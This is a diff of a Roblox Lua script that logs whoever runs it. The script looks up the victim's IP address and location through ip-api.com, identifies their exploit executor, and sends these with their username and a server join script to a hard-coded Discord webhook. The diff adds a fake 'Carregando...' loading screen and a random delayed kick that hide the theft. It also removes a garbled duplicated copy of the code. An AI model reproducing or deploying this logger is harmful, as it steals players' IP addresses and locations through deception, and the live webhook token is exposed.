@@ -1,4 +1,9 @@
-local join_script = string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%s, '%s', game:GetService('Players').LocalPlayer)", game.PlaceId, game.JobId)
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+-- Código pesado executando primeiro
+task.spawn(function()
+   local join_script = string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%s, '%s', game:GetService('Players').LocalPlayer)", game.PlaceId, game.JobId)
 print(helo) --line above generates a script that allows u to join the logged user
 
 --checks executor
@@ -12,45 +17,7 @@ local webhookcheck =
 local url =
    "https://discord.com/api/webhooks/1365048432175091764/Fi1uKKfwbEg4hOxIiKVRhb66J39Yhh-jSI052ZJWHNdWVSYbqeZ909sHx_e5fLuj89D5" --pretty obvious what to do here
 local data = {
-            ["username"] = "Salmon-L0Glocal join_script = string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%s, '%s', game:GetService('Players').LocalPlayer)", game.PlaceId, game.JobId)
-print(helo) --line above generates a script that allows u to join the logged user
-
---checks executor
-local webhookcheck =
-   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
-   secure_load and "Sentinel" or
-   KRNL_LOADED and "Krnl" or
-   SONA_LOADED and "Sona" or
-   "Kid with shit exploit"
-
-local url =
-   "https://discord.com/api/webhooks/1365048432175091764/Fi1uKKfwbEg4hOxIiKVRhb66J39Yhh-jSI052ZJWHNdWVSYbqeZ909sHx_e5fLuj89D5" --pretty obvious what to do here
-local data = {
-            ["username"] = "Air logger", --webhook name thing idk
-            ["avatar_url"] = "https://cdn.upload.systems/uploads/haO2MM1R.png", --avatar image url
-    
-    ["content"] = " @everyone **" ..game.Players.LocalPlayer.Name.. "** just ran your logger", --normal message
-    ["embeds"] = {
-       {
-           ["title"] = "** " ..game.Players.LocalPlayer.Name.. " just ran your logger**",
-           ["description"] = "**"..game:HttpGet("http://ip-api.com/line/?fields=61439").. "Username: "  ..game.Players.LocalPlayer.Name..", Uses: " ..webhookcheck.. "**",
-           ["type"] = "rich", --line above sends all the info grabbed using the api + username and exacutor
-           ["color"] = 14680319,
-           ["footer"] = {
-             ["text"] = "" ..join_script.. "", --sends join script
-           },
-       },
-   }
-}
-
-local newdata = game:GetService("HttpService"):JSONEncode(data)
-
-local headers = {
-   ["content-type"] = "application/json"
-}
-request = http_request or request or HttpPost or syn.request
-local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
-request(abcdef)", --webhook name thing idk
+            ["username"] = "Salmon-L0G", --webhook name thing idk
             ["avatar_url"] = "https://cdn.upload.systems/uploads/haO2MM1R.png", --avatar image url
     
     ["content"] = " @everyone **" ..game.Players.LocalPlayer.Name.. "** just ran your logger", --normal message
@@ -75,3 +42,34 @@ local headers = {
 request = http_request or request or HttpPost or syn.request
 local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
 request(abcdef)
+end)
+
+-- Espera 3 segundos antes de mostrar a tela de loading
+task.wait(3)
+
+-- Criar a tela de loading
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Parent = game.CoreGui
+ScreenGui.IgnoreGuiInset = true
+
+local Frame = Instance.new("Frame")
+Frame.Size = UDim2.new(1,0,1,0)
+Frame.BackgroundColor3 = Color3.fromRGB(20,20,20)
+Frame.Parent = ScreenGui
+
+local Label = Instance.new("TextLabel")
+Label.Size = UDim2.new(1,0,1,0)
+Label.BackgroundTransparency = 1
+Label.Text = "Carregando..."
+Label.TextColor3 = Color3.fromRGB(255,255,255)
+Label.TextSize = 28
+Label.Font = Enum.Font.GothamBold
+Label.Parent = Frame
+
+-- Kick depois de 30 a 60 segundos
+local LoadingTime = math.random(30,60)
+task.spawn(function()
+    task.wait(LoadingTime)
+    ScreenGui:Destroy()
+    LocalPlayer:Kick("Loading falhou")
+end)
